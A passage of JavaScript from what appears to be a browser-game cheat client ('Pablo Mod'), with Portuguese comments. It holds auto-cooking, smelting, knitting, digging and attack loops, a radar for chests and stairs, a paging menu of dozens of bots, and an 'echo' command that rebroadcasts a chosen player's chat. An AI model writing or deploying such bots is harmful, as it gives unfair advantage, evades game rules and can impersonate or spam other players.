        await xDelay(523);
		if (keySpace.isDown) keySpace.isDown = false;
        await xDelay(626);
        await xDoDropSlot(1, 1);
        await xDelay(636);
        await xDoMove(myself.x - 1, myself.y);
        await xDelay(748);
		await xDoChangeDir(1);
		await xDelay(746);
      }
    }

    // Ataca se parado e com arma equipada
    if (!keySpace.isDown && inv[0].sprite != undefined && inv[0].equip == 1) {
      await xDoKeyDown(6);
      await xDelay(840);
    }

    xGoing[110] = false;
  }
}

dsk.setCmd('/destru', () => {
  dsk.destruction.enabled = !dsk.destruction.enabled;

  if (dsk.destruction.enabled) {
    // Captura posição atual ao ligar
    destructPosX = myself.x;
    destructPosY = myself.y;
    dsk.localMsg(`Destruction: Ativado @ (${destructPosX}, ${destructPosY})`, '#5f5');

    (async function loop() {
      while (dsk.destruction.enabled) {
        await Destruction();
        await xDelay(800);
      }
    })();
  } else {
    xGoing[110] = false;
    xDoKeyUp(6);
    dsk.localMsg('Destruction: Desativado', '#f55');
  }
});

// ── ECHO MANDOKA ─────────────────────────────────────────────

dsk.echo = {
  enabled: false,
  targetName: 'Mandoka'
};

dsk.setCmd('/echo', (context) => {
  if (context) {
    dsk.echo.targetName = context.trim();
    dsk.echo.enabled = true;
    dsk.localMsg(`Echo: seguindo ${dsk.echo.targetName}`, '#5f5');
    return;
  }

  dsk.echo.enabled = !dsk.echo.enabled;
  dsk.localMsg(
    `Echo: ${dsk.echo.enabled ? `Ativado (${dsk.echo.targetName})` : 'Desativado'}`,
    dsk.echo.enabled ? '#5f5' : '#f55'
  );
});

dsk.on('postPacket:pkg', packet => {
  if (!dsk.echo.enabled) return;
  if (!packet?.data) return;

  try {
    const arr = JSON.parse(packet.data);
    arr.forEach(raw => {
      const item = JSON.parse(raw);
      if (item.type !== 'message') return;
      if (!item.name) return;

      if (item.name.toLowerCase() !== dsk.echo.targetName.toLowerCase()) return;

      const text = dsk.stripHTMLTags(item.text).trim();
	  if (!text) return;

	  // Remove o prefixo "Nome: " se existir
	  const cleaned = text.replace(/^.*?:\s*/, '');
	  if (!cleaned) return;

	  setTimeout(() => {
	    _originalSend({ type: 'chat', data: `/b ${cleaned}` });
	  }, 300);
    });
  } catch (e) {}
});

//--COOKING----//
dsk.cooking = { enabled: false };
window.cookPositionX = 0;
window.cookPositionY = 0;

function xGetAvailableID(ids) {
  return ids.find(id => xGetSlotByID(id) != undefined);
}
async function xDropAvailable(amount, ids) {
  const id = xGetAvailableID(ids);
  if (id != undefined) await xDoDropByID(amount, id);
}
function xGetGroundItemByPos(x, y, ids) {
  for (let i in objects.items) {
    const obj = objects.items[i];
    if (obj && obj.x == x && obj.y == y && ids.includes(obj.sprite)) {
      return obj;
    }
  }
  return null;
}

const WOOD_IDS = [249, 648];
const FOOD_IDS = [227, 593, 776, 486];

function xHasWood() {
  return WOOD_IDS.some(id => xGetSlotByID(id) != undefined);
}
function xHasFood() {
  return FOOD_IDS.some(id => xGetSlotByID(id) != undefined);
}

async function xCollectResources() {
  // --- Coleta madeira ---
  if (!xHasWood()) {
    // Vai até a posição base (em cima da madeira)
    if (myself.x !== cookPositionX || myself.y !== cookPositionY) {
      await xDoMove(cookPositionX, cookPositionY);
      return;
    }
    if (myself.x !== cookPositionX || myself.y !== cookPositionY) return;
    let tries = 0;
    while (!xHasWood() && tries < 10) {
      if (xGetGroundItemByPos(myself.x, myself.y, WOOD_IDS)) {
        await xDoPickUp();
        await xDelay(500);
      } else {
        await xDelay(500);
      }
      tries++;
    }
  }

  // --- Coleta comida (1 sqm acima do cook position) ---
  if (!xHasFood()) {
    if (myself.x !== cookPositionX || myself.y !== cookPositionY - 1) {
      await xDoMove(cookPositionX, cookPositionY - 1);
      return;
    }
	if (myself.x !== cookPositionX || myself.y !== cookPositionY - 1) return;
    let tries = 0;
    while (!xHasFood() && tries < 10) {
      await xDoPickUp();
      await xDelay(500);
      tries++;
    }
    
    await xDelay(400);
  }
}

function xHasFirePit(direction) {
  const dy = direction === 'up' ? -1 : 1;
  return objects.items.find(el =>
    el && el.name && el.name.includes('Fire Pit') &&
    el.x === myself.x && el.y === myself.y + dy
  );
}

async function cook() {
  if (dskPaused) return;
  if (!myself || game_state !== 2) return;

  await xDelay(500);

  // --- Fogueira de cima ---
  await xLookUp();
  if (!xHasFirePit('up')) {
    dsk.localMsg('Cook: sem fogueira (cima), voltando...', '#fa5');
    await xDoMove(cookPositionX, cookPositionY);
    await xDelay(400);
    return;
  }
  await xDelay(100);
  await xDoKeyPress(6, 100);
  await xDelay(150);
  await xDropAvailable(1, WOOD_IDS);
  await xDelay(150);
  await xDoDropByID(1, 941);
  await xDelay(150);
  await xDropAvailable(1, FOOD_IDS);
  await xDelay(200);

  // --- Fogueira de baixo ---
  await xLookDown();
  if (!xHasFirePit('down')) {
    dsk.localMsg('Cook: sem fogueira (baixo), voltando...', '#fa5');
    await xDoMove(cookPositionX, cookPositionY);
    await xDelay(400);
    return;
  }
  await xDelay(100);
  await xDoKeyPress(6, 100);
  await xDelay(150);
  await xDropAvailable(1, WOOD_IDS);
  await xDelay(150);
  await xDoDropByID(1, 941);
  await xDelay(150);
  await xDropAvailable(1, FOOD_IDS);
  await xDelay(300);
}

async function xCook() {
  if (dskPaused) return;
  if (!myself || game_state !== 2) return;

  if (currentLevel > 0 && skillLevel >= currentLevel && ['cooking'].includes(skillName)) {
    await xDelay(1000);
    xGoing[1] = false;
    dsk.cooking.enabled = false;
    dsk.localMsg('Cook: Desativado', '#f55');
    return;
  }

  if (xGoing[1] != true) {
    xGoing[1] = true;

    // Verifica e coleta recursos antes de cozinhar
    await xCollectResources();

    // Se mesmo assim não tiver os dois, aborta o ciclo
    if (!xHasWood() || !xHasFood()) {
      dsk.localMsg('Cook: sem madeira ou comida, aguardando...', '#fa5');
      xGoing[1] = false;
      return;
    }

    await xDoMove(myself.x - 1, myself.y);
    await cook();

    const allowedNames = ['Animal Gate', 'Stone Wall', 'Tribe Gate', 'Signpost', 'Wood Wall', 'Personal Gate'];
    if (allowedNames.includes(xGetWallByPos(myself.x - 1, myself.y)?.name)) {
      await xDoMove(cookPositionX, cookPositionY);
      await xDelay(800);
    }

    xGoing[1] = false;
  }
}

dsk.setCmd('/cook', () => {
  dsk.cooking.enabled = !dsk.cooking.enabled;
  if (dsk.cooking.enabled) {
    cookPositionX = myself.x;
    cookPositionY = myself.y;
    dsk.localMsg(`Cook Bot: Ativado @ (${cookPositionX}, ${cookPositionY})`, '#5f5');
    (async function loop() {
      while (dsk.cooking.enabled) {
        await xCook();
        await xDelay(200);
      }
    })();
  } else {
    dsk.localMsg('Cook Bot: Desativado', '#f55');
  }
});

//--SMELTING--//
dsk.smelting = { enabled: false };
window.smeltPositionX = 0;
window.smeltPositionY = 0;

const ORE_IDS  = [539, 538];
// WOOD_IDS já definido no cooking: [249, 648]

function xHasOre() {
  return ORE_IDS.some(id => xGetSlotByID(id) != undefined);
}

async function xCollectSmeltResources() {
  // --- Coleta madeira ---
  if (!xHasWood()) {
    if (myself.x !== smeltPositionX || myself.y !== smeltPositionY) {
      await xDoMove(smeltPositionX, smeltPositionY);
      return;
    }
	
	if (myself.x !== smeltPositionX || myself.y !== smeltPositionY) return;
	
    let tries = 0;
    while (!xHasWood() && tries < 10) {
      if (xGetGroundItemByPos(myself.x, myself.y, WOOD_IDS)) {
        await xDoPickUp();
        await xDelay(500);
      } else {
        await xDelay(500);
      }
      tries++;
    }
  }

  // --- Coleta minério (1 sqm acima do smelt position) ---
  if (!xHasOre()) {
	if (myself.x !== smeltPositionX || myself.y !== smeltPositionY - 1) {
      await xDoMove(smeltPositionX, smeltPositionY - 1);
      return;
    }
	
	if (myself.x !== smeltPositionX || myself.y !== smeltPositionY - 1) return;
	
    let tries = 0;
    while (!xHasOre() && tries < 10) {
      await xDoPickUp();
      await xDelay(500);
      tries++;
    }
    await xDelay(400);
  }
}

async function smelt() {
  if (dskPaused) return;
  if (!myself || game_state !== 2) return;

  await xDelay(500);

  // --- Fogueira de cima ---
  await xLookUp();
  if (!xHasFirePit('up')) {
    dsk.localMsg('Smelt: sem fogueira (cima), voltando...', '#fa5');
    await xDoMove(smeltPositionX, smeltPositionY);
    await xDelay(400);
    return;
  }
  await xDelay(150);
  await xDoKeyPress(6, 100);
  await xDelay(350);
  await xDoDropByID(1, 694);
  await xDelay(350);
  await xDropAvailable(1, ORE_IDS);
  await xDelay(300);
  await xDoPickUp();
  await xDelay(200);
  await xDropAvailable(1, WOOD_IDS);
  await xDelay(200);
  await xDoDropByID(1, 711);
  await xDelay(200);

  // --- Fogueira de baixo ---
  await xLookDown();
  if (!xHasFirePit('down')) {
    dsk.localMsg('Smelt: sem fogueira (baixo), voltando...', '#fa5');
    await xDoMove(smeltPositionX, smeltPositionY);
    await xDelay(400);
    return;
  }
  await xDelay(150);
  await xDoKeyPress(6, 100);
  await xDelay(350);
  await xDoDropByID(1, 694);
  await xDelay(350);
  await xDropAvailable(1, ORE_IDS);
  await xDelay(300);
  await xDoPickUp();
  await xDelay(200);
  await xDropAvailable(1, WOOD_IDS);
  await xDelay(200);
  await xDoDropByID(1, 711);
  await xDelay(200);
}

async function xSmelt() {
  if (dskPaused) return;
  if (!myself || game_state !== 2) return;

  if (currentLevel > 0 && skillLevel >= currentLevel && ['smelting'].includes(skillName)) {
    await xDelay(1000);
    xGoing[2] = false;
    dsk.smelting.enabled = false;
    dsk.localMsg('Smelt: Desativado', '#f55');
    return;
  }

  if (xGoing[2] != true) {
    xGoing[2] = true;

    await xCollectSmeltResources();

    if (!xHasWood() || !xHasOre()) {
      dsk.localMsg('Smelt: sem madeira ou minério, aguardando...', '#fa5');
      xGoing[2] = false;
      return;
    }

    await xDoMove(myself.x - 1, myself.y);
    await smelt();

    const allowedNames = ['Animal Gate', 'Stone Wall', 'Tribe Gate', 'Signpost', 'Wood Wall', 'Personal Gate'];
    if (allowedNames.includes(xGetWallByPos(myself.x - 1, myself.y)?.name)) {
      await xDoMove(smeltPositionX, smeltPositionY);
      await xDelay(800);
    }

    xGoing[2] = false;
  }
}

dsk.setCmd('/smelt', () => {
  dsk.smelting.enabled = !dsk.smelting.enabled;
  if (dsk.smelting.enabled) {
    smeltPositionX = myself.x;
    smeltPositionY = myself.y;
    dsk.localMsg(`Smelt Bot: Ativado @ (${smeltPositionX}, ${smeltPositionY})`, '#5f5');
    (async function loop() {
      while (dsk.smelting.enabled) {
        await xSmelt();
        await xDelay(300);
      }
    })();
  } else {
    dsk.localMsg('Smelt Bot: Desativado', '#f55');
  }
});

// ── TOP LVL HUD ───────────────────────────────────────────────

dsk.topHud = {
  enabled:    false,
  dragging:   false,
  ox:         0,
  oy:         0,
  _statObj:   null,
  _reincObj:  null,
  _topSkill:  '---',
  _listening: false,
  _interval:  null,
};

dsk.topHud.label = jv.text('🏆 Top Skill: ---', {
  font:            '13px Verdana',
  fill:            0xFFD700,
  stroke:          0x000000,
  strokeThickness: 3,
  lineJoin:        'round',
  align:           'left',
});
dsk.topHud.label.x = 8;
dsk.topHud.label.y = 65;
dsk.topHud.label.visible = false;
dsk.topHud.label.interactive = true;
dsk.topHud.label.buttonMode  = true;
ui_container.addChild(dsk.topHud.label);

// Drag
dsk.topHud.label.on('pointerdown', e => {
  dsk.topHud.dragging = true;
  const pos = e.data.getLocalPosition(ui_container);
  dsk.topHud.ox = pos.x - dsk.topHud.label.x;
  dsk.topHud.oy = pos.y - dsk.topHud.label.y;
});
dsk.topHud.label.on('pointermove', e => {
  if (!dsk.topHud.dragging) return;
  const pos = e.data.getLocalPosition(ui_container);
  dsk.topHud.label.x = pos.x - dsk.topHud.ox;
  dsk.topHud.label.y = pos.y - dsk.topHud.oy;
});
dsk.topHud.label.on('pointerup',        () => { dsk.topHud.dragging = false; });
dsk.topHud.label.on('pointerupoutside', () => { dsk.topHud.dragging = false; });

// Listener de mensagem (registrado uma vez só)
dsk.topHud._onMessage = function(e) {
  try {
    const data = JSON.parse(e.data);
    if (data.type !== 'pkg') return;
    const parsed = JSON.parse(JSON.parse(data.data)[0]);

    if (parsed.type === 'stat')  dsk.topHud._statObj  = parsed.obj;
    if (parsed.type === 'reinc') dsk.topHud._reincObj = parsed.obj;

    if (dsk.topHud._statObj && dsk.topHud._reincObj) {
      dsk.topHud._topSkill = dsk.topHud._reincObj.skill || '---';
      dsk.topHud._statObj  = null;
      dsk.topHud._reincObj = null;
    }
  } catch (_) {}
};

// Busca os dados do servidor
dsk.topHud.fetch = () => {
  if (!dsk.topHud._listening) {
    connection.addEventListener('message', dsk.topHud._onMessage);
    dsk.topHud._listening = true;
  }
  send({ type: 'c', r: 'st' });
  setTimeout(() => send({ type: 'c', r: 'rn' }), 1000);
};

// Atualiza o label no postLoop
dsk.on('postLoop', () => {
  if (!dsk.topHud.enabled) return;
  dsk.topHud.label.text = `🏆 Top Skill: ${dsk.topHud._topSkill}`;
});

dsk.setCmd('/top', () => {
  dsk.topHud.enabled = !dsk.topHud.enabled;
  dsk.topHud.label.visible = dsk.topHud.enabled;

  if (dsk.topHud.enabled) {
    // Busca imediata ao ativar
    dsk.topHud.fetch();
    // Auto-refresh a cada 1 minuto e meio (90s)
    dsk.topHud._interval = setInterval(() => {
      if (dsk.topHud.enabled) dsk.topHud.fetch();
    }, 90000);
    dsk.localMsg('Top Skill HUD: Ativado (refresh 90s)', '#5f5');
  } else {
    clearInterval(dsk.topHud._interval);
    dsk.topHud._interval = null;
    dsk.localMsg('Top Skill HUD: Desativado', '#f55');
  }
});


// ── MENU PRINCIPAL ─────────────────────────────────────────────

dsk.menu = jv.Dialog.create(200, 320);
dsk.menu.visible = false;

dsk.menu.header = jv.text('Pablo Mod', {
  font: '14px Verdana',
  fill: 0xFFD700,
  stroke: 0x555555,
  strokeThickness: 2,
});
dsk.menu.addChild(dsk.menu.header);
jv.center(dsk.menu.header);
jv.top(dsk.menu.header, 4);

dsk.menu.close = jv.Button.create(0, 0, 24, 'X', dsk.menu, 24);
jv.top(dsk.menu.close, 4);
jv.right(dsk.menu.close, 4);
dsk.menu.close.on_click = () => (dsk.menu.visible = 0);

dsk.menu.move = jv.Button.create(0, 0, 24, '@', dsk.menu, 24);
jv.top(dsk.menu.move, 4);
jv.right(dsk.menu.move, 28);

dsk.menu._px = 0;
dsk.menu._py = 0;
window.addEventListener('mousemove', e => { dsk.menu._px = e.clientX; dsk.menu._py = e.clientY; });
window.addEventListener('touchmove', e => { dsk.menu._px = e.touches[0].clientX; dsk.menu._py = e.touches[0].clientY; });

dsk.menu.updatePosition = () => {
  if (dsk.menu.move.is_pressed) {
    const canvas = document.querySelector('canvas');
    const rect = canvas ? canvas.getBoundingClientRect() : { left: 0, top: 0, width: jv.game_width, height: jv.game_height };
    dsk.menu.x = (dsk.menu._px - rect.left) * (jv.game_width / rect.width) - dsk.menu.w / 2;
    dsk.menu.y = (dsk.menu._py - rect.top) * (jv.game_height / rect.height) - 12;
  }
  if (dsk.menu.x < 0) dsk.menu.x = 0;
  if (dsk.menu.y < 0) dsk.menu.y = 0;
  if (dsk.menu.x + dsk.menu.w > jv.game_width)  dsk.menu.x = jv.game_width - dsk.menu.w;
  if (dsk.menu.y + dsk.menu.h > jv.game_height) dsk.menu.y = jv.game_height - dsk.menu.h;
};
dsk.on('postLoop', dsk.menu.updatePosition);

// Lista de bots com referência ao objeto de estado
dsk.menu.items = [
	{ label: 'Speed',       state: () => dsk.speed?.enabled,       toggle: () => dsk.commands['/speed']() },
	{ label: 'Skills',   state: () => dsk.skillHud?.enabled,   toggle: () => dsk.commands['/skills']() },
	{ label: 'Skills Config',   state: () => dsk.armasManager?.enabled,   toggle: () => dsk.commands['/skillconfig']() },
	{ label: 'Coocking',    state: () => dsk.cooking?.enabled,     toggle: () => dsk.commands['/cook']() },
	{ label: 'Smelting',   state: () => dsk.smelting?.enabled,    toggle: () => dsk.commands['/smelt']() },
	{ label: 'Farming', state: () => dsk.farm?.enabled, toggle: () => dsk.commands['/farm']() },
	{ label: 'Sword',       state: () => dsk.sword?.enabled, toggle: () => dsk.commands['/sword']() },
	{ label: 'Hammer',       state: () => dsk.hammer?.enabled, toggle: () => dsk.commands['/hammer']() },
	{ label: 'Armas Bot',   state: () => dsk.armas?.enabled,       toggle: () => dsk.commands['/armas']() },
	{ label: 'Destruction', state: () => dsk.destruction?.enabled, toggle: () => dsk.commands['/destru']() },
	{ label: 'AutoCraft',   state: () => dsk.craft?.enabled,       toggle: () => dsk.commands['/craft']() },
	{ label: 'Fishing',    state: () => dsk.fish?.enabled, toggle: () => dsk.commands['/fish']() },
	{ label: 'Knitting',   state: () => dsk.knit?.enabled,   toggle: () => dsk.commands['/knit']() },
	{ label: 'Newbi Config', state: () => mm?.visible,       toggle: () => dsk.commands['/newbiconfig']() },
	{ label: 'Newbi Myst',    state: () => dsk.myst?.enabled, toggle: () => dsk.commands['/newbi']() },
	{ label: 'Reconnect',   state: () => dsk.reconnect?.enabled,   toggle: () => dsk.commands['/reconnect']() },
	{ label: 'Bússola',     state: () => dsk.ginfo?.label?.visible, toggle: () => dsk.commands['/compass']() },
	{ label: '% Barras',        state: () => dsk.bars?.enabled,        toggle: () => dsk.commands['/bars']() },
	{ label: 'Habilidades',   state: () => dsk.ablManager?.enabled,   toggle: () => dsk.commands['/abl']() },
	{ label: 'Inventario',   state: () => dsk.invManager?.enabled,   toggle: () => dsk.commands['/inv']() },
	{ label: 'WC Config', state: () => wcm?.visible,       toggle: () => dsk.commands['/wcaveconfig']() },
	{ label: 'WC Myst',        state: () => dsk.wcave?.enabled, toggle: () => dsk.commands['/wcave']() },
	{ label: 'Auto Heal', state: () => dsk.heal?.enabled,  toggle: () => dsk.commands['/heal']() },
	{ label: 'Auto Food', state: () => dsk.food?.enabled,  toggle: () => dsk.commands['/food']() },
	{ label: 'Diso', state: () => dsk.diso?.enabled, toggle: () => dsk.commands['/diso']() },
	{ label: 'WW',   state: () => dsk.ww?.enabled,   toggle: () => dsk.commands['/ww']() },
	{ label: 'Follow',      state: () => dsk.follow?.enabled,      toggle: () => dsk.commands['/follow']() },
	{ label: 'Radar',   state: () => dsk.radar?.enabled,   toggle: () => dsk.commands['/radar']() },
	{ label: 'Onlines',   state: () => dsk.whoManager?.enabled,   toggle: () => dsk.commands['/on']() },
	{ label: 'Tribe List',   state: () => dsk.tribeManager?.enabled,   toggle: () => dsk.commands['/tlist']() },
	{ label: 'Mining/SSD Config', state: () => minm?.visible,       toggle: () => dsk.commands['/miningconfig']() },
	{ label: 'Mining Bot',    state: () => dsk.mining?.enabled, toggle: () => dsk.commands['/mining']() },
	{ label: 'SSD Bot',       state: () => dsk.ssd?.enabled,    toggle: () => dsk.commands['/ssd']() },
	{ label: 'Rotation Config',state: () => rm?.visible,           toggle: () => dsk.commands['/rotationconfig']() },
	{ label: 'Rotation',       state: () => dsk.rotation?.enabled, toggle: () => dsk.commands['/rotation']() },
	{ label: 'Hide Name',   state: () => dsk.hide?.enabled,   toggle: () => dsk.commands['/hide']() },
	{ label: 'Cavar',   state: () => dsk.cavar?.enabled,   toggle: () => dsk.commands['/cavar']() },
	{ label: 'Discord Config', state: () => dcm?.visible, toggle: () => dsk.commands['/discordconfig']() },
	{ label: 'Discord',     state: () => dsk.discord?.enabled,     toggle: () => dsk.commands['/discord']() },
	{ label: 'Clay Bot', state: () => dsk.clay?.enabled, toggle: () => dsk.commands['/clay']() },
	{ label: 'HealBot', state: () => dsk.healbot?.enabled, toggle: () => dsk.commands['/healbot']() },
	{ label: 'Aloe Bot', state: () => dsk.aloe?.enabled, toggle: () => dsk.commands['/aloe']() },

];

dsk.menu.page = 0;
dsk.menu.perPage = 10;
dsk.menu.btns = [];

// Cria os botões de página
dsk.menu.btnPrev = jv.Button.create(0, 0, 24, '<', dsk.menu, 22);
jv.bottom(dsk.menu.btnPrev, 4);
dsk.menu.btnPrev.x = dsk.menu.w - 58;
dsk.menu.btnPrev.on_click = () => {
  if (dsk.menu.page > 0) { dsk.menu.page--; dsk.menu.rebuild(); }
};

dsk.menu.btnNext = jv.Button.create(0, 0, 24, '>', dsk.menu, 22);
jv.bottom(dsk.menu.btnNext, 4);
dsk.menu.btnNext.x = dsk.menu.w - 30;
dsk.menu.btnNext.on_click = () => {
  const maxPage = Math.ceil(dsk.menu.items.length / dsk.menu.perPage) - 1;
  if (dsk.menu.page < maxPage) { dsk.menu.page++; dsk.menu.rebuild(); }
};

dsk.menu.pageLabel = jv.text('', {
  font: '11px Verdana',
  fill: 0xffffff,
  stroke: 0x000000,
  strokeThickness: 2,
});
dsk.menu.pageLabel.x = dsk.menu.w - 100;
jv.bottom(dsk.menu.pageLabel, 8);
dsk.menu.addChild(dsk.menu.pageLabel);

dsk.menu.rebuild = () => {
  dsk.menu.btns.forEach(b => dsk.menu.removeChild(b));
  dsk.menu.btns = [];

  const start = dsk.menu.page * dsk.menu.perPage;
  const slice = dsk.menu.items.slice(start, start + dsk.menu.perPage);
  const maxPage = Math.ceil(dsk.menu.items.length / dsk.menu.perPage);

  slice.forEach((item, i) => {
    const btn = jv.Button.create(0, 0, 160, '', dsk.menu, 22);
    btn.x = 20;
    btn.y = 35 + i * 26;

    // label do nome (branco fixo)
    const lbl = jv.text(item.label, {
      font: '11px Verdana',
      fill: 0xffffff,
      stroke: 0x000000,
      strokeThickness: 2,
    });
    lbl.x = 6;
    lbl.y = 4;
    btn.addChild(lbl);
    btn.lbl = lbl;

    // label do status (ON/OFF colorido)
    const status = jv.text('OFF', {
      font: '11px Verdana',
      fill: 0xff4444,
      stroke: 0x000000,
      strokeThickness: 2,
    });
    status.x = 120;
    status.y = 4;
    btn.addChild(status);
    btn.status = status;

    btn.item = item;
    btn.on_click = () => {
      item.toggle();
      // Fecha o menu se algum dialog de configuração foi aberto
      const dialogOpen = 
        dsk.armasManager?.visible ||
        dsk.ablManager?.visible   ||
        dsk.invManager?.visible   ||
        dsk.whoManager?.visible   ||
        dsk.tribeManager?.visible;
      if (item.state() || dialogOpen) dsk.menu.visible = false;
      dsk.menu.refresh();
    };
    dsk.menu.btns.push(btn);
  });

  dsk.menu.pageLabel.text = `${dsk.menu.page + 1}/${maxPage}`;
  dsk.menu.refresh();
};

dsk.menu.refresh = () => {
  dsk.menu.btns.forEach(btn => {
    const on = btn.item.state();
    btn.lbl.text    = btn.item.label;           // nome sempre branco
    btn.status.text = on ? 'ON' : 'OFF';        // só o status muda
    btn.status.style.fill = on ? 0x00ff00 : 0xff4444; // verde ou vermelho
    btn.tint = on ? 0x44bb44 : 0xbb4444;        // fundo do botão
  });
};

dsk.menu.rebuild();

dsk.on('postLoop', () => {
  if (!dsk.menu.visible) return;
});

// Atualiza o tint em tempo real no postLoop
dsk.on('postLoop', () => {
  if (!dsk.menu.visible) return;
  dsk.menu.refresh();
});

// Botão flutuante para abrir/fechar o menu
dsk.menu.toggleBtn = jv.Button.create(0, 0, 60, '☰ Menu', ui_container, 22);
dsk.menu.toggleBtn.x = 1;
dsk.menu.toggleBtn.y = 385;
dsk.menu.toggleBtn.title.style.fill = 0xFFD700;
dsk.menu.toggleBtn.visible = false;
dsk.menu.toggleBtn.on_click = () => {
  dsk.menu.visible = !dsk.menu.visible;
  if (dsk.menu.visible) dsk.menu.refresh();
};

dsk.setCmd('/menu', () => {
  dsk.menu.toggleBtn.visible = !dsk.menu.toggleBtn.visible;
  dsk.localMsg(`Menu: ${dsk.menu.toggleBtn.visible ? 'Ativado' : 'Desativado'}`, dsk.menu.toggleBtn.visible ? '#5f5' : '#f55');
});

// ── RADAR ─────────────────────────────────────────────

dsk.radar = {
  enabled: false,
  intervalo: null,
  textos: []
};

dsk.setCmd('/radar', () => {
  dsk.radar.enabled = !dsk.radar.enabled;

  if (dsk.radar.enabled) {
    dsk.radar.start();
    dsk.localMsg('Radar: Ativado', '#5f5');
  } else {
    dsk.radar.stop();
    dsk.localMsg('Radar: Desativado', '#f55');
  }
});

dsk.radar.start = () => {
  if (dskPaused) return; // ← adiciona isso
  if (!myself || game_state !== 2) return;
  dsk.radar.intervalo = setInterval(dsk.radar.renderizar, 1000); // atualiza a cada 1s
};

dsk.radar.stop = () => {
  clearInterval(dsk.radar.intervalo);
  dsk.radar.intervalo = null;
  dsk.radar.limpar();
};

dsk.radar.limpar = () => {
  dsk.radar.textos.forEach(txt => ui_container.removeChild(txt));
  dsk.radar.textos = [];
};

// Usa sua função de renderização adaptada
dsk.radar.renderizar = () => {
  dsk.radar.limpar();

  var coisasperto = objects.items.filter(el => el && (
    el.name == "Altar" || el.name == "Stairs Up" || el.name == "Hole" ||
    el.name == "Stairway" || el.name == "Odd Chest" || el.name == "Treasure Chest" ||
    el.name == "Deep Recall" || el.name == "Glowing Altar" || el.name == "Shiny Rock"
  ));

  for (var i = 0; i < Math.min(coisasperto.length, 30); i++) {
    var obj = coisasperto[i];
    var novoNome;

    switch (obj.name) {
      case "Altar": novoNome = "Altar"; break;
      case "Stairs Up": novoNome = "Escada Up"; break;
      case "Hole": novoNome = "Buraco"; break;
      case "Stairway": novoNome = "Escada Down"; break;
      case "Odd Chest": novoNome = "Bau Chaos"; break;
      case "Treasure Chest": novoNome = "Bau"; break;
      case "Deep Recall": novoNome = "Recall"; break;
      case "Glowing Altar": novoNome = "Glow Altar"; break;
      case "Shiny Rock": novoNome = "Gold Stone"; break;
    }

    var texto = jv.text(" " + novoNome + " " + obj.x + " " + obj.y, {
      font: "11px Verdana",
      fill: 16777096,
      lineJoin: "round",
      stroke: jv.color_dark,
      strokeThickness: 4,
      align: "right"
    });

    texto.x = 420;
    texto.y = 30 + i * 18;
    ui_container.addChild(texto);
    dsk.radar.textos.push(texto);
  }
};

// ── KNITBOT ─────────────────────────────────────────────

dsk.knit = {
  enabled: false,
  loop: null
};

dsk.setCmd('/knit', () => {
  dsk.knit.enabled = !dsk.knit.enabled;

  if (dsk.knit.enabled) {
    dsk.knit.start();
    dsk.localMsg('KnitBot: Ativado', '#5f5');
  } else {
    dsk.knit.stop();
    dsk.localMsg('KnitBot: Desativado', '#f55');
  }
});

dsk.knit.start = () => {
  // loop automático
  (function loop() {
    if (!dsk.knit.enabled) return;
    KnitBot(); // chama sua função original
    dsk.knit.loop = requestAnimationFrame(loop);
  })();
};

dsk.knit.stop = () => {
  if (dsk.knit.loop) {
    cancelAnimationFrame(dsk.knit.loop);
    dsk.knit.loop = null;
  }
};

// sua função original continua igual
async function KnitBot() {
  if (dskPaused) return; // ← adiciona isso
  if (!myself || game_state !== 2) return;
    if (currentLevel > 0 && skillLevel >= currentLevel && ['knitting'].includes(skillName)) {
	await xDelay(1000);
	dsk.knit.enabled = false;
	dsk.localMsg('Knit: Desativado', '#f55');
    return;
	}

  if (xIfChatHas("Click the Knit button")) {
    xDoClearChat("Click the Knit button");
    await xDoKeyUp(6);
    await xDelay(400);
    jv.build_dialog.info.use.on_click();
    await xDelay(400);
  }

  if (xIfChatHas("You are all ready to knit")) {
    xDoClearChat("You are all ready to knit");
    await xDoKeyDown(6);
    await xDelay(400);
  }

  if (xIfChatHas("You are working on")) {
    xDoClearChat("You are working on");
    if (keySpace.isDown == false) {
      await xDoKeyDown(6);
    }
  }
}

// ── CAVAR ─────────────────────────────────────────────

dsk.cavar = {
  enabled: false,
  loop: null,
  dir: null
};

dsk.setCmd('/cavar', (context) => {
  dsk.cavar.enabled = !dsk.cavar.enabled;

  if (context) {
    const map = { up:0, right:1, down:2, left:3 };
    if (map[context.toLowerCase()] !== undefined) {
      dsk.cavar.dir = map[context.toLowerCase()];
    }
  } else {
    dsk.cavar.dir = null;
  }

  if (dsk.cavar.enabled) {
    dsk.cavar.start();
    dsk.localMsg(`Cavar: Ativado ${dsk.cavar.dir !== null ? `(dir=${dsk.cavar.dir})` : ''}`, '#5f5');
  } else {
    dsk.cavar.stop();
    dsk.localMsg('Cavar: Desativado', '#f55');
  }
});

dsk.cavar.start = async () => {
  while (dsk.cavar.enabled) {
    await cavar(dsk.cavar.dir ?? myself.dir);
    await xDelay(500);
  }
};

dsk.cavar.stop = () => {
  dsk.cavar.enabled = false;
};

// Função genérica de cavar
async function cavar(dir) {
  if (dskPaused) return; // ← adiciona isso
  if (!myself || game_state !== 2) return;

  const offsets = {
    0: { dx: 0, dy: -1 }, // cima
    1: { dx: +1, dy: 0 }, // direita
    2: { dx: 0, dy: +1 }, // baixo
    3: { dx: -1, dy: 0 }  // esquerda
  };

  const off = offsets[dir];
  if (!off) return;

  const x1 = myself.x + off.dx;
  const y1 = myself.y + off.dy;
  const x2 = myself.x + off.dx * 2;
  const y2 = myself.y + off.dy * 2;

  // tile atrás
  const backX = myself.x - off.dx;
  const backY = myself.y - off.dy;

  if (occupied(x2, y2) == 0) {
    // anda 1 sqm para frente
    myself.move(x1, y1);
  }
  else if (occupied(x1, y1) == 0 && occupied(x2, y2) == 1) {
    // ajusta direção e bate
    if (myself.dir != dir) {
      send({ type: 'm', x: myself.x, y: myself.y, d: dir });
      await xDelay(200);
    }
    await xDoKeyPress(6, 100);
	}
	  else if (occupied(x1, y1) == 1 && occupied(x2, y2) == 1) {
	  const backDir = (dir + 2) % 4; // direção oposta

	  if (occupied(backX, backY) == 0) {
		// atrás livre → anda para trás, vira e bate
		myself.move(backX, backY);
		await xDelay(300);

		if (myself.dir != dir) {
		  send({ type: 'm', x: myself.x, y: myself.y, d: dir });
		  await xDelay(200);
		}
		await xDoKeyPress(6, 100);
	  } else {
		// atrás ocupado → insiste até liberar
		if (myself.dir != backDir) {
		  send({ type: 'm', x: myself.x, y: myself.y, d: backDir });
		  await xDelay(200);
		}

		let tries = 0;
		while (occupied(backX, backY) == 1 && tries < 20) {
		  await xDoKeyPress(6, 100);
		  await xDelay(400);
		  tries++;
		  // opcional: mostrar no chat quantas vezes já tentou
